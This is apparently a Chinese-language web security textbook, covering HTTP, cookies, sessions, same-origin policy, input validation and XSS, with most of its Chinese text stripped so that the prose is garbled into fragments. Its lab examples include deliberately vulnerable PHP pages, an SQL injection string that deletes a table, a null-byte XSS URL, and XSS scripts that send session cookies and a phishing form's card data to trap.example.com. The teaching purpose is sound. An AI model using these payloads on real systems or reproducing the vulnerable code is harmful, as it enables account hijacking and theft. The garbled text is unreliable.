Web

     

978-7-115-37047-1 2014-09 400 79.00   web

 Web  OWASP51CTO    Web

SQLXSSCSRFWebWeb VMware PlayerPHP Web
<>   2008HASH KYOCERA Communication Systems IPATwitter ID@ockeghem
<>  Ruby  mruby   http://zhaowen.me
<>  Java/Rubyhttp://liubin.org
<> OWASP OWASP51CTO 
1


  
 

 Web  978-4797361193 
SoftBank Creative
496

2


  Web  
     Web  OWASP  TOP Ten Web   Web  80% SQL  OWASP Top Ten  Web      OWASP     Web  Web   Web    Web   Web   SQL XSSCSRF   Web  Web   Web  
OWASP 51CTO  OWASP 
3


2011  3  7700  PlayStation NetworkPSN  PSN  23  2011  12  CSDN 600   2013  3  Evernote  5000    Kickstarter     Web   Web  "XX " Web  "`'"" CSRF" "" Web   "Web " Web   Web   
 SQL XSSCSRF  Web  
 

 2014  2 
4


 Web ""  Web     
       Web  Web        VMware Player    PHP 
5


    kaito834 Masahiro Yamadamasa141421356  Twitter   ----SB Creative   
2011  1  
6

 1  Web 
"" 
1.1" Bug"
 Bug  Bug   Bug  Bug Vulnerability  Bug 






 1 1 Bug  
 BugWeb   Web   Web  
1.2
 

 

7





  2

3  20  5000 

 
" """"`'" 


 Web   Web 

    

" "
8

  BotnetBot Malware DDoS 2010  Gumblar   Web  1-1 
 1-1Web     4  DDoS   Web    2"" 32013  9  ----
9

4"" ----
1.3
"Web  "

A Bug 
B
A SQL SQL InjectionCross Site Scripting XSS   
Directory TraversalB A 
Web " " 
1.4 Bug 
 Bug Bug   HTTPS  Bug
 HTTPS " "
 Bug   Bug  
 Bug 
1.5

 1  Bug 
10

  2  VMware    3  HTTPCookieSession Web    4  Web    5   6 Web    7  Web   8  Web 
11

 2 
 Windows 7   Windows XP  Windows Vista
2.1
 LinuxUbuntu 10.04 Apache 2.2 PHP 5.3 PostgreSQL 8.4 Postfix  Sendmail 
 Windows  VMware  VMware  Linux 
 2-1  Linux    
12

VMware PlayerVMware  Fiddler  VMware Player  Fiddler  VMware Player   Linux  
2.2 VMware Player
 VMware Player VMware Player  VMware   VMware Player  Linux  Web   2011  4 VMware Player  3.1.4 1
CPU  x86  x86-64  Intel VT  AMDV PAE  Pentium M  Windows XPWindows Vista  Windows 7 1G   1G   U  SD  VMware Player  150M   VMware Player  VMware Player  http://www.vmware.com/go/downloadplayer-cn/   2-2 
13

 2-2 VMware   VMware Player 
 2-3 
14

 2-4 
 2-5 15

1 Windows  Linux  VMware Player 3.1.2 Mac OS X  VMware Player 3.1.2 
2.3
 WASBOOK.ZIP http://www.ituring.com.cn/book/download/d2970acc-5c0f-45ae-857d-be55a5421be4  600M 800M   U  SD  "" WASBOOK 
 2-6WASBOOK    WASBOOK  wasbook.vmx VMware Player VMware Player ""
16

 2-7""  VMware Tools "" Linux  
 2-8 VMware Tools  wasbook login:  Ctrl+G   root wasbook ifconfig eth0
17

 2-9 ifconfig   inet addr:  IP  IP  hosts    
  VMware Player  Ctrl+G   VMware Player   Ctrl+Alt    root  
# shutdown -h now
18

 down  Linux VMware Player  
Linux 
 Linux  LinuxUbuntu
 hosts 
 Windows  hosts 
example.jp..................
trap.example.com......
hosts C:\Windows\System32\drivers\etc\hosts Windows Vista  Windows 7 " " hosts """"""  hosts 
IP   IP 
hosts 

# localhost name resolution is handled within DNS itself.

#

127.0.0.1

localhost

#

::1

localhost

127.0.0.1

localhost

192.168.71.128

example.jp

trap.example.com

example.jp  trap.example.com  IP  192.168.126.128
 hosts  
 ping 
 hosts  Windows  ping example.jp ping 
""
IP 

19

hosts 
 hosts 
"" ZIP  IP   ping 
Apache  PHP 
 ping  Internet ExplorerIE http://example.jp/phpinfo.php 2-10 

 2-10 Web  
 4.9  4.11  
 2  2 
 2-1


wasbook bob


wasbook wasbook


wasbook@example.jp bob@example.jp

POP3 
example.jp example.jp

20

 wasbook  bob  bob    POP3 
2.4 Fiddler
 HTTP Fiddler  HTTP   Fiddler 
 Fiddler Fiddler  Eric Lawrence  Web Fiddler  Windows   HTTP  Burp suite  Paros Fiddler   Fiddler   Fiddler Fiddler  http://fiddler2.com/get-fiddler "Download Fiddler2"  Fiddler  Fiddler  2-11"Decode"
 2-11Fiddler  Fiddler  Internet ExplorerIE   Fiddler  IE  http://example.jp/phpinfo.php
21

 phpinfo.php  F5  2-12 

 2-12 Fiddler  HTTP  "Web Session" /phpinfo.php "Inspect""Raw" "Raw" HTTP  Fiddler  HTTP  
 







root wasbook alice

wasbook wasbook wasbook

Linuxroot  

22

bob

wasbook



carol

wasbook



down













OS(Linux)

Ubuntu

10.04.1 LTS

Web

Apache

2.2.14

PHP

PHP

5.3.2



PostgreSQL

8.4.4



Postfix

2.7.0

POP3

Dovecot

1.2.9

SSH

OpenSSH

5.3

Apache  /var/www  POP3 
23

 17  POP3  Dovecot
# /etc/init.d/dovecot start  2-13 Dovecot  2-13 "OK" Dovecot  POP3 
24

 3 Web   HTTP 
 Web  HTTP  ----
3.1HTTP 
 HTTP Web  Web    Web  HTTP    HTTP  HTTP 31-001.php  PHP  
/31/31-001.php
<body> <?php echo htmlspecialchars(date('G:i')); ?> </body>
 http://example.jp/31/ "/31/ ""31-001: " 31
25

 3-1/31/   3-2 
 3-2  HTTP HTTP Request  HTTP HTTP Response 3-3
26

 3-3HTTP   Fiddler  HTTP   Fiddler  HTTP  Fiddler  IE   Fiddler Fiddler  HTTP  
 3-4 Fiddler  HTTP   Fiddler  HTTP  3-4  "Inspectors"-"Raw""Raw" 31-001.php    Web    Fiddler  Request Message  1 Request Line URLURI 3-5 Fiddler
27

 SchemeFQDN  URLFiddler URL

 3-5
HTTP  GET POST  HEAD GET  POST  HTML  form  method  POST 
 2 Header  3-4  Host  1Host  FQDN80 

 3-4 Web Response Message 3-6 Body



HTTP/1.1 200 OK


 

Date: Mon, 10 Jan 2011 05:34:30 GMT Server: Apache/2.2.14 (Ubuntu) X-Powered-By: PHP/5.3.2-1ubuntu4.2 Vary: Accept-Encoding Content-Length: 20 Keep-Alive: timeout=15, max=100 Connection: Keep-Alive Content-Type: text/html; charset=UTF-8
<body> 14:34</body>

 3-6

28

  3-7

 3-7
 3-1200 301  302404500
 3-1

 1xx 2xx 3xx 4xx 5xx

     

  2  3-6 
Content-Length  Content-Type  MIME HTML  text/html MIME    3-2 MIME 

MIME text/plain text/html

  HTML

29

application/xml text/css mage/gif image/jpeg image../Images/7application/pdf

XML CSS GIF JPEG PNG PDF

 charset=UTF-8  HTTP   6   HTTP   HTTP   HTTP  2

15  21   HTTP ----"" 1 HTTP  1.0Host  2 HTTP Web [1] Web [2]
 -  -  ""Input Form HTTP   HTTP 31-002.php31-003.php31-004.php 
/31/31-002.php

<html> <head><title>  </title></head> <body> <form action="31-003.php" method="POST">  <input type="text" name="name"><br>  <input type="text" name="mail"><br>
30

 <input type="radio" name="gender" value="  ">  <input type="radio" name="gender" value="  ">  <br> <input type="submit" value="  "> </form> </html>
/31/31-003.php
<?php $name = @$_POST['name']; $mail = @$_POST['mail']; $gender = @$_POST['gender'];
?> <html> <head><title>  </title></head> <body> <form action="31-004.php" method="POST">  :<?php echo htmlspecialchars($name, ENT_NOQUOTES, 'UTF-8'); ?><br>  :<?php echo htmlspecialchars($mail, ENT_NOQUOTES, 'UTF-8'); ?><br>  :<?php echo htmlspecialchars($gender, ENT_NOQUOTES, 'UTF-8'); ?><br> <input type="hidden" name="name" value="<?php echo htmlspecialchars($name, ENT_COMPAT <input type="hidden" name="mail" value="<?php echo htmlspecialchars($mail, ENT_COMPAT <input type="hidden" name="gender" value="<?php echo htmlspecialchars($gender, ENT_COMPAT <input type="submit" value="  "> </form> </html>
/31/31-004.php
<?php $name = @$_POST['name']; $mail = @$_POST['mail']; $gender = @$_POST['gender']; // 
?> <html> <head><title>  </title></head> <body>  :<?php echo htmlspecialchars($name, ENT_NOQUOTES, 'UTF-8'); ?><br>  :<?php echo htmlspecialchars($mail, ENT_NOQUOTES, 'UTF-8'); ?><br>  :<?php echo htmlspecialchars($gender, ENT_NOQUOTES, 'UTF-8'); ?><br>  </body></html>
 /31/ "31-002"  3-8
31

 3-8 ""HTTP  Fiddler   3-9
 3-9"" Fiddler  HTTP  POST   3-9  POST /31/31-003.php HTTP/1.1 Referer: http://example.jp/31/31-002.php Content-Type: application/x-www-form-urlencoded Content-Length: 70 Host: example.jp   name=%E5%BE%B3%E4%B8%B8%E6%B5%A9&mail=toku@example.jp&gender=%E7%94%B7  POST GET  Message Body   POST   POST 
32

 POST  Content-Length  Content-Type
Content-Length 
Content-Type  MIME  HTML  form  application/x-www-form-unlencoded" = " &  Percent-Encoding

 URL URL   %xx xx   3-8 "" UTF-8  E5 BE B3   %E5%BE%B3
 %20 application/x-www-form-unlencoded   +3"I'm a programmer" I%27m+a+programmer %27
Re fe re r
 Referer   URL form a  img   Referer 
Referer 
Referer  Referer  RefererReferer   Fiddler   4
 URL Referer URL  ID   Referer   4.6.3 
URL  Referer 
GET  POST 
 GET  POST 
HTTP 1.1  RFC26165  9  15  
GET 
33

GET   POST  ""  /  /  /   POST  GET  URL   URL  6 POST   POST  GET  URL  Referer  URL Access Log  POST   GET     hidden   3-8"" 3-10 
34

 3-10  hidden  HTML    FTP  telnet HTTP  HTTP  7HTML hidden  ""hidden  Web   Fiddler  hidden   Fiddler  Rules "Automatic Breakpoints"-"Before Requests" 311
 3-11 Rules "Automatic Breakpoints"-"Before Requests" ""Fiddler  3-12  "WebForms"Fiddler  
35

 3-12Fiddler   3-13 
 3-13 "Run to Completion"IE   3-14 ""
36

 3-14  HTTP  hidden   hidden 
    hidden  hidden   Fiddler   hidden   hidden  
   tokumaru@example.jp  tokumaru@example.jp   maria@example.jp   maria@example.jp  hidden   hidden  hidden  hidden  hidden  
37

 hidden  Cookie SessionCookie   Cookie Monster Bug   4.6.4   5.1  5.3  hidden    hidden  3 URLURIapplication/x-www-form-unlencoded  HTML   4 Fiddler  hidden  5http://tools.ietf.org/html/rfc2616 6 RFC2616RFC1738  RFC3986  URL   7 FTP  telnet   HTTP  HTTP HTTP  Basic NTLM  Digest   HTTP HTTP   HTTP  Basic   Basic  Basic  3-15 Basic  "401 Unauthorized"  ID  ID  
38

 3-15Basic 
Basic  Web  PHP  PHP  Basic 
/31/31-010.php
<?php $user = @$_SERVER['PHP_AUTH_USER']; $pass = @$_SERVER['PHP_AUTH_PW'];
 if (! $user || ! $pass) { header('HTTP/1.1 401 Unauthorized'); header('WWW-Authenticate: Basic realm="Basic Authentication Sample"'); echo "  "; exit; }
?> <body>  <br>  :<?php echo htmlspecialchars($user, ENT_NOQUOTES, 'UTF-8'); ?> <br>  :<?php echo htmlspecialchars($pass, ENT_NOQUOTES, 'UTF-8'); ?> <br></body>
 ID  ID   Basic 
HTTP/1.1 401 Unauthorized WWW-Authenticate: Basic realm="Basic Authentication Sample"
 /31/ "31-010Basic "  ID  31-010.php  401 HTTP   3-16  401  Basic  ID 
39

 3-17  3-16 401  HTTP 
40

 3-17Basic  ID   ID"user1""pass1" OK HTTP   Authorization 
Authorization: Basic dXNlcjE6cGFzczE=
Basic  ID  Base64   Fiddler  Encoder  Fiddler  Tools "Text Encode/Decode" TextWizard  dXNlcjE6cFGzczE=  "From Base64" 3-18 "user1:pass1"
 3-18 Fiddler  TextWizard  Base64 PHP  Basic   ID 
 3-19 Basic  http://example.jp/31/   Authorization   ID 
41

Basic  Basic  Logout
Basic 


 12345 9876
 5 
 23456  3  12345 9876

 

""Authentication Web  Basic   HTML  ID  SSL  
""Authorization  /  /  
Web   ID   
5.1  5.3 
Cookie   HTTP  
"" ""
 HTTP 
42

ID  HTTP  ""
HTTP  Cookie Cookie  " = " Cookie   PHP 
 3 ID  31-020.phpID 31-021.phpID31022.php /31/ "31-020:  Cookie "
/31/31-020.php
<?php session_start(); // 
?> <html> <head><title>  </title></head> <body> <form action="31-021.php" method="POST">  <input type="text" name="ID"><br>  <input type="password" name="PWD"><br> <input type="submit" value="  "> </form> </body> </html>
/31/31-021.php
<?php session_start(); //  $id = @$_POST['ID']; $pwd = @$_POST['PWD']; //  if ($id == '' || $pwd == '') { die('  '); } $_SESSION['ID'] = $id;
?> <html> <head><title>  </title></head> <body>  <a href="31-022.php">  </a> </body> </html>
43

/31/31-022.php
<?php session_start(); //  $id = $_SESSION['ID']; if ($id == '') { die('  '); }
?> <html> <head><title>  </title></head> <body>  :<?php echo htmlspecialchars($id, ENT_NOQUOTES, 'UTF-8'); ?> </body> </html>
 Basic  ID 
 3-20  31-020.php  ID 
HTTP/1.1 200 OK Set-Cookie: PHPSESSID=gg5144avrhmdiaelvh80l4lb53; path=/ Content-Length: 279 Content-Type: text/html; charset=UTF-8 <html> <head><title>  </title></head> <body>  Set-Cookie Web  Cookie 
44

 ID ""
POST /31/31-021.php HTTP/1.1 Referer: http://example.jp/31/31-020.php Content-Type: application/x-www-form-urlencoded Host: example.jp Content-Length: 18 Cookie: PHPSESSID=gg5144avrhmdiaelvh80l4lb53
ID=user1&PWD=pass1
 Cookie example.jp Cookie PHPSESSID=...Cookie  Cookie  
Cookie  PHPSESSID  ID31-021.php   ID  $_SESSION['ID']  31-022.php  ID
 Cookie 
Cookie  Cookie 
Cookie 
Cookie 
 Cookie "" ID " Cookie "PHP   Web 

 Basic 

 005
 005 12345 9876

 005
 5 
45

 005 23456  3 

 ID  Cookie 
005  

 006
 1  005 005 
 005 99999  3 


 ID  PHPSESSID  26  ID 
 1 ID 
 2 ID 
 3 ID 
 1  ID   ID  ID ID   8  
 ID  Web  PHPTomcat.NET  ID  ID   4.6  
  
 2  ID  
46

  9466ir8fgmmk1gn6raeo7ne71   9466ir8fgmmk1gn6raeo7ne71    9466ir8fgmmk1gn6raeo7ne71   9466ir8fgmmk1gn6raeo7ne71 12345 9876     9466ir8fgmmk1gn6raeo7ne71 99999  3     ID  Session Fixation Attack 4.6.4     9466ir8fgmmk1gn6raeo7ne71    9466ir8fgmmk1gn6raeo7ne71   9466ir8fgmmk1gn6raeo7ne71 12345 9876   eut1j15a058pm8gapa87l937h6
47


 9466ir8fgmmk1gn6raeo7ne71 99999  3  

 ID "" 
 ID  3  ID   ID   ID  ID  
 Cookie   ID  7.3   4   PHP   ID  URL  Referer  4.6.3   ID   ID  
 ID  SSLSecure Socket Layer  Cookie  Cookie   Cookie  PHPSESSID "path=/" 
 Cookie  3-3   3-3Cookie 





48

Domain Path Expires Secure HttpOnly

Cookie 
Cookie  URL 
Cookie  
 SSL  Cookie
 Cookie  JavaScript 

 3  DomainSecureHttpOnly
Cookie  Domain 
Cookie   Cookie Domain 
 3-21  Domain  Cookie  Domain=example.jpCookie  a.example.jp  b.example.jp a.example.com 

 3-21 Cookie  Domain 
 a.example.jp  Set-Cookie  Domain=example.com Cookie  Cookie   Cookie 
 Domain Cookie  Domain  Cookie  Domain  
 example.com foo.example.com  bar.example.com  foo.example.com  Cookie   Domain=example.com Cookie  bar.example.com
 Cookie  Domain 
 Cookie  Domain 
49


Cookie Monster Bug
 hash-c.co.jp Cookie   hash-c.co.jp Cookie  .co.jp"Cookie Monster Bug"
 Cookie Monster Bug  .co.jp  Cookie  amazon.co.jp  yahoo.co.jp  .co.jp   Cookie
 Internet Explorer 8IE8 Cookie Monster Bug  city.yokohama.jp  yokohama.jp   tokumaru.kanazawa.yokohama.jp kanazawa   Internet Explorer  tokumaru.kanazawa.yokohama.jp  yokohama.jp  Cookie
 .lg.jp  city.yokohama.lg.jp  
Cookie 
 Secure  Cookie  SSL   Cookie  SSL 
 Cookie  Cookie  SSL  4.8.2 
Cookie  HttpOnly 
 HttpOnly JavaScript  Cookie 
 JavaScript  Cookie  Cookie  ID  Cookie  HttpOnly  JavaScript  Cookie 
 HttpOnly   HttpOnly   Cookie  HttpOnly 
 PHP  Cookie  HttpOnly  php.ini  
50

session.cookie_httponly = on
 Cookie  HttpOnly  8http://www.cryptrec.go.jp/list.html   Web  HTTPBasic Cookie  Cookie   
 [1]  .2010.Web HTTPURIHTML REST Web HTTPURIHTML  REST.  . [2]  .2010. Web ---- Web "Web "---- Web .  .
51

3.2
---- "" Web     Web Active AttackPassive Attack 
  Web SQL   3-22
 3-22    3  
  3-23 
52


 3-23 ""  Adobe Flash Player   Adobe ReaderAdobe Flash PlayerJRE     3-24 
 3-24     
   
53

 4   FTP  7.1   Web  7.1   SQL  4.4   4.3 
2010  Gumblar 2008   SQL  1     3-25
 3-25      HTML9  HTML    JavaScript     Cookie
54


 Web  CSRF 4.5  XSS 4.3  HTTP  4.7  9 HTML URL
  4   


 JavaScriptJava AppletAdobe Flash PlayerActiveX JavaScript  


 ActiveX  Applet  
Sandbox JavaScriptJava AppletAdobe Flash Player   "sandbox" ""




  JavaScript 

55

Same Origin Policy JavaScript  
 frame  iframe 
JavaScript  iframe 
 JavaScript  iframe  Host iframe  JavaScript   iframe  HTML 
 iframe ""HTML10
/32/32-001.html HTML

<html>

<head><title>  frame  </title></head>

<body>

 iframe HTML

<iframe name="iframe1" width="300" height="80" src="http://example.jp/32/32-002.html"

</iframe><br>

<input type="button" onclick="go()" value="  ">

<script>

function go() {

try {

 iframe 

var x = iframe1.document.form1.passwd.value;

document.getElementById('out').innerHTML = x;

} catch (e) {

 DOM 

alert(e.message);

}

}

</script>

<span id="out"></span>

</body>

</html>

 iframe ""HTML
/32/32-002.html HTML
<body> <form name="form1"> iframe  <br>  <input type="text" name="passwd" value="password1"> </form> </body>
56

 3-26 ""iframe   JavaScript  iframe 
 3-26JavaScript  iframe  iframe  iframe  JavaScript   example.jp  trap.example.com iframe  example.jp  3-27   example.jp iframe  
 3-27 iframe   JavaScript  iframe     iframe  HTML32-900.html trap.example.com  iframe  32-002.html HTML32900.html   32-001.html    http://trap.example.com/32/32-900.html ""
57

 3-28 JavaScript  iframe   iframe  example.jp trap.example.com JavaScript  JavaScript  
 """" 
URL FQDN Fully Qualified Domain Name 11 Scheme   Cookie  JavaScript  JavaScript  12
 iframe  Ajax  XMLHttpRequest 

 XSS   iframe  JavaScript   JavaScript  iframe   iframe  XSS13XSS  4.3 
58

 3-29XSS  JavaScript 
 JavaScript
 XSS  JavaScript   JavaScript  JavaScript
 JavaScript
 JavaScript   JavaScript 
 JavaScript  JavaScript  

JavaScript 
 JavaScript 
 JavaScript  XSS  JavaScript   JavaScript 
59

 JavaScript
Firefox  Greasemonkey JavaScript Greasemonkey  
Greasemonkey  JavaScript  Greasemonkey 
1032-001.html  XSS  4.3 
11 JavaScript  document.domain  
12i-mode2.0 NTT DoCoMo
13 iframe  XSS  iframe  XSS  
JavaScript   JavaScript  
frame  iframe 
iframe  frame  JavaScript   iframe 
   X-FRAM E-OPTIONS
X-FRAME-OPTIONS  frame  iframe   IEFirefoxGoogle ChromeSafariOpera 
X-FRAME-OPTIONS  DENY SAMEORIGIN DENY  frame  SAMEORIGIN 
 PHP  X-FRAME-OPTIONS  SAMEORIGIN 
header('X-FRAME-OPTIONS: SAMEORIGIN');
X-FRAME-OPTIONS Clickjacking14 frame  iframe  DENY  frame  SAMEORIGIN frame 
img 
60

img  src  Cookie "" JavaScript   Referer   Referer  script   script  src  JavaScript A  B  JavaScript 3-30 
 3-30 script JavaScript  B  JavaScript   HTML  A JavaScript  document.cookie  A  Cookie  A  B  JavaScript  B  Cookie  B B  JavaScript  A   JSONPJSON with paddingJSONP  Ajax  JavaScript JSONP  JSONP  CSS CSSCascading Style Sheets HTML  link 
61

 CSS  @import  JavaScript  addImport   CSS  Internet Explorer   CSSXSS  15 HTML  JavaScript  CSS    CSSXSS  CSSXSS   IE8  form  action  form  action  action form   JavaScript   form CSRFCSRF   form CSRF  4.5   14 iframe  CSS   15http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2005-4089    Web  Web  JavaScript  Web   Web  
62

 4 Web 
 Web  4.1  Web   4.2  Web "" 4.3  Web  XSS SQL 
4.1Web 
  Web  4-1  Web "" Web  HTTP  HTTP   HTTP """"
 4-1Web   4-1 ""Web  
 HTML  HTTP HTTP 
63

 SQL SQL   Shell OS    4-1    1 "" 1Middleware  "HTML ""JavaScript " 4-1    Web   Web   
 Web HTMLHTTP  SQL  Web  
 DelimiterTab  Web   SQL $id 
SELECT * FROM users WHERE id='$id'
$id  SQL    $id  SQL 
';DELETE FROM users --
 SQL  $id  64

SELECT * FROM users WHERE id='';DELETE FROM users --'
 SELECT  DELETE FROM  SQL  4.4.1 
SQL "" SQL 
"" 
 4-1 ""  
 4-1







 



HTML

JavaScript < " 2

HTTP 

HTTP

HTTP 



SQL

SQL

SQL

' 

OS 

Shell 



; | 



sendmail 

 



2"<" HTML "<" "<"
65

    Web  
66

4.2
 Web ""    Web  Web  HTTP  GETPOSTCookie Web  "" 4-2 "" Web 
 4-2""  a 3 3 6  b c  4 6    Web  
67

4  b HTTP   c   3 
 PHP  mb_check_encoding 
mb_check_encoding 
bool mb_check_encoding(string $var, string $encoding)
 $var  $encoding $encoding   PHP  $var  true  6 
  PHP  php.ini   4-2 Web 







PHP Perl Java

php.ini 

mb_convert_encoding

×

Encode::decode

setCharacterEncoding String 

68

ASP.NET Web.config

×

 4-2  Web   PHP  mb_convert_encoding 
mb_convert_encoding 
string mb_convert_encoding(string $str, string $to_encoding, string $from_encoding)

mb_convert_encoding  3  

 PHP  Shift_JIS   name  UTF-8 mb_convert_encoding 
/42/42-001.php
<?php $name = isset($_GET['name']) ? $_GET['name'] : ''; // Shift_JIS if (! mb_check_encoding($name, 'Shift_JIS')) { die('  '); } // Shift_JIS  UTF-8 $name = mb_convert_encoding($name, 'UTF-8', 'Shift_JIS');
?> <body>  <?php echo htmlspecialchars($name, ENT_NOQUOTES, 'UTF-8'); ?> </body>
 4-3 

69

 4-342-001.php   Shift_JIS  %82%21  Shift_JIS   0x40  %20  Shift_JIS   6 
 4-4 Shift_JIS    PHP  php.ini  Java  .NET ?  Unicode  U+FFFD    php.ini     70

  Web  
  Web   Web 
                 SQL    PHP     5 
71

"" NULL PHP  \0   C  Unix  Windows  API   C  PHP     42-002.php  ereg  $p 
/42/42-002.php
<body> <?php
$p = $_GET['p']; if (ereg('^[0-9]+$', $p) === FALSE) {
die('  '); } echo $p; ?> </body>
$p  URL  42-002.php
http://example.jp/42/42-002.php?p=1%00<script>alert('XSS')</script>
 4-5 
 4-5 ereg  72

 JavaScript "XSS"XSS  4.3  ereg 
ereg  ereg  URL  %00%00  ereg    4-6
 4-6  <script>... "1"" " JavaScript    XSS   4.10.1                ID  8  
73


" "
CR  LF Tab ASCII  0x20  0x7FDELETE Web  Web  
input  type  text  password textarea   Tab Tab 

  
 Web   10   SQL  

hidden select Cookie   ID Cookie  Referer  HTTP 
PHP 
PHP  ereg preg mb_ereg3 ereg  PHP5.3   preg  mb_ereg preg  UTF-8   mb_ereg 
 preg  mb_ereg  
 PHP  PHP 
11  5 
74

 preg_match "1-5 " /42/42-010.php
<?php $p = isset($_GET['p']) ? $_GET['p'] : ''; if (preg_match('/\A[a-z0-9]{1,5}\z/ui', $p) == 0) { die('  1-5  '); }
?> <body> p  <?php echo htmlspecialchars($p, ENT_NOQUOTES, 'UTF-8'); ?> </body>  preg_match  4-7 
 4-7"15 " 
u   preg_match   UTF-8  u  i  i   \A  \z \A \z  ^  $  \A  \z   ^  $ ""$   Bug  4-8  ^  $  \A  \z 6 %0a LF  
75

 4-8

[  ]  [0-9]  [a-zA-Z]  [a-zA-Z0-9]  i 

{  } {1,5}  1  5 0  {0,5} 
 mb_ereg
 preg_match  mb_ereg 
/42/42-012.php
<?php // mb_regex_encoding  mb_regex_encoding('UTF-8'); //  $p = isset($_GET['p']) ? $_GET['p'] : ''; if (mb_ereg('\A[a-zA-Z0-9]{1,5}\z', $p) === false) { die('  1-5  '); }
?>
mb_regex_encoding  mb_ereg  php.ini  
mb_ereg  preg_match  3 mb_ereg  /   u  false m b_ereg   === 
2
   POSIX  7[[:^cntrl:]] ""
76

/42/42-013.php
<?php $addr = isset($_GET['addr']) ? $_GET['addr'] : ''; if (preg_match('/\A[[:^cntrl:]]{1,30}\z/u', $addr) == 0) { die('  30  Tab  '); }
 textarea   Tab Tab   1400
preg_match('/\A[\r\n\t[:^cntrl:]]{1,400}\z/u', $comment)
 mb_ereg  \d  \w
 \d \w  mb_ereg  \d  \w  \d   Unicode
Web  
  [a-zA-Z0-9_] 
5 SQL  6 
6 /42/42-011.php
7POSIX  IEEE  Unix POSIX  POSIX 
  PHP  URL   name 
/42/42-020.php
<?php //  //  // $key : GET  // $pattern :  // $error : 
77

//  : string function getParam($key, $pattern, $error) {
$val = isset($_GET[$key]) ? $_GET[$key] : ''; // Shift_JIS if (! mb_check_encoding($val, 'Shift_JIS')) {
die('  '); } // Shift_JIS  UTF-8 $val = mb_convert_encoding($val, 'UTF-8', 'Shift_JIS'); if (preg_match($pattern, $val) == 0) {
die($error); } return $val; } //  $name = getParam('name', '/\A[[:^cntrl:]]{1,20}\z/', '  20  '); ?> <body>  <?php echo htmlspecialchars($name, ENT_NOQUOTES, 'UTF-8'); ?> </body>
getParam  
 

 Web  
 .NET Framework "" 4-9  Visual Web Developer 2010  RangeValidator  RangeValidator  Integer   1100  4-9  Type MinimumValue MaximumValue ErrorMessage 
78

 4-9  4-10 
 4-10RangeValidator  "101" JavaScript "  1100 " RangeValidator  ErrorMessage    .NET Framework  
79

  Web   
       
     "        "       PHPPerlJavaVB.NET "" " 0100 "
PHP pre g_match  POSIX 
if (preg_match('/\A[[:^cntrl:]]{0,100}\z/u', $s) == 1) { #  OK
PHP  preg_match  POSIX  Perl  \P{Cc}   PerlJava.NET 
if (preg_match('/\A\P{Cc}{0,100}\z/u', $s) == 1) { #  OK
PHP mb_e re g mb_ereg  POSIX 
if (mb_ereg('\A[[:^cntrl:]]{0,100}\z', $addr) !== false) { #  OK
80

Pe rl Perl  \P{Cc}  Perl   \ 
if ($s =~ /\A\P{Cc}{0,100}\z/) { #  OK
Jav a Java  String  matches matches   \A  \z Java  \  
if (s.matches("\\P{Cc}{0,100}")) { //  OK
VB.NET .NET Framework  Regex VB.NET   \ 
if Regex.IsMatch(s, "\A\P{Cc}{0,100}\z") then '  OK
 [1]  .2009  6  2 . 3. 2011  1  6 ITpro: http://itpro.nikkeibp.co.jp/article/COLUMN/20090525/330611/
81

4.3
  
 4.3.1 4.3.2  URLJavaScript  CSSCascading Style Sheets   4.3.3  4.3.1   Web   HTML Cross-Site Scripting  XSS8 XSS  8 CSS Cascading Style Sheets  Web  XSS 
 Cookie   Web   Web  XSS   Web  XSS   XSS  XSS  Web  XSS   XSS  HTML Escape  XSS 
82

  XSS  XSS  3 
 Cookie   JavaScript 

XSS  Cookie   PHP  
/43/43-001.php
<?php session_start(); // 
?> <body>  :<?php echo $_GET['keyword']; ?><br>  </body>
"Haskell"URL 
http://example.jp/43/43-001.php?keyword=Haskell

83

 4-11"Haskell"

keyword=<script>alert(document.cookie)</script>
 9
 4-12 ID   Cookie  IDPHPSESSID JavaScript  ID
 Cookie   ID  
     /43/43-900.html
<html><body> 
84

<br><br> <iframe width=320 height=100 src="http://example.jp/43/43-001.php?keyword=<script> </body></html>
 HTML  iframe /43/43001.php XSS  10  iframe   XSS 
 4-13 1.  iframe  2. Cookie  URL   3.  Cookie 
 4-13 iframe  URL 
http://example.jp/43/43-001.php?keyword=<script>window.location='http://trap.example.com/4
 JavaScript  
<script> window.location='http://trap.example.com/43/43-901.php?sid=' +document.cookie; </script>
 JavaScript  Cookie  URL  43-091.php11 ID   wasbook@example.jp
/43/43-901.php
<?php
85

mb_language('Japanese'); $sid = $_GET['sid']; mb_send_mail('wasbook@example.jp', '  ', '  ID:' . $sid, 'From: cracked@trap.e ?> <body>  <br> <?php echo $sid; ?> </body>
 4-14 

 4-14 ID
 XSS   ID  ID 
 JavaScript 
 JavaScript  Cookie  JavaScript  XSS  
 4-3XSS 







 


86

2005  10 
2006  6 
2009  4 
2010  9 

JS/Spacehero(samy) JS.Yamanner@m JS.Twettir -

myspace.com Yahoo  
twitter.com
twitter.com

 samy    
        
        
       

 
 Ajax  JavaScript  Web 

87

Application Program Interface API API   XSS  JavaScript    XSS   XSS   4-15  XSS  HTML  /  / 
 4-15  12  XSS 
43/43-902.php
<!DOCTMPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"> <html> <head><title>  </title></head> <body> <form action="" method="POST">   <input size="20" name="name" value="<?php echo @$_POST['name']; ?>"><br>   <input size="20" name="addr" value="<?php echo @$_POST['addr']; ?>"><br>  <input size="20" name="tel" value="<?php echo @$_POST['tel']; ?>"><br>   <input size="10" name="kind" value="<?php echo @$_POST['kind']; ?>">   <input size="5" name="num" value="<?php echo @$_POST['num']; ?>"> <br> <input type=submit value="  "></form> </body> </html>
88

 XSS 
 HTML43-902.html"" XSS   JavaScript  XSS  
     43/43-902.html

<html>

<head><title>  </title></head>

<body>



<BR>

<form action="http://example.jp/43/43-002.php" method="POST">

<input name="name" type="hidden" value='value='"></form><form style=top:5px;left:



<input style="cursor:pointer;text-decoration:underline;color:blue;

border:none;

background:transparent;font-size:100%;" type="submit" value="">

</form>



</body>

</html>



 4-16  HTML 

<FORM action="" METHOD=POST>

 from 

89

  <INPUT size="20" name="name" value=""></form>  form 
<form style=top:5px;left:5px;position:absolute;z-index:99;background-color:white  action 
action=http://trap.example.com/43/43-903.php method=POST>  <br>   <input size=20 name=name><br>  <input size=20 name=addr><br> <input size=5 name=num><br>  <input size=16 name=card>  <input size </form>"><BR>
 form  form  </form>  form   form  style   form   z-index  (99) form   form  action  URL 

 4-17 ""  form  action  URL  URL   https  
90

XSS  JavaScript script  "script" JavaScript   XSS  XSS  JavaScript  XSS   JavaScript  URL XSSReflected XSS 43-001.php  XSS   XSS XSS  
 4-18 XSS  JavaScript   XSS  XSSStored XSS XSSPresistent XSS
91

